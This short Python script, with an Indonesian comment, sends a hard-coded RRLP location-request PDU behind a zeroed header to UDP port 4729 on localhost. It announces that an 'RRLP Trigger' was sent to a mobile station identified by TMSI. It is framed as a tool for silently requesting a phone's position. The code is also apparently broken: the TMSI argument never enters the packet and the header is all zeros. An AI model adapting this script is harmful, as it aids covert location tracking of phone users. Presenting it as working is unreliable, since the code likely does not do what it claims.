import socket
import struct

RRLP_PDU = bytes.fromhex(
    "0006000602010101"  # contoh MsrPositionRequest minimal
)

def send_rrlp(ms_tmsi):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    gsm_header = struct.pack('!BBBBBBBBHHBBBBBB', 
                             3, 0, 0, 0, 0, 0, 0, 0,
                             0, 0, 0, 0, 0, 0, 0, 0)
    pkt = gsm_header + RRLP_PDU
    sock.sendto(pkt, ('127.0.0.1', 4729))
    print(f"[+] RRLP Trigger sent to MS (TMSI={ms_tmsi})")

if __name__ == "__main__":
    send_rrlp("0x01")
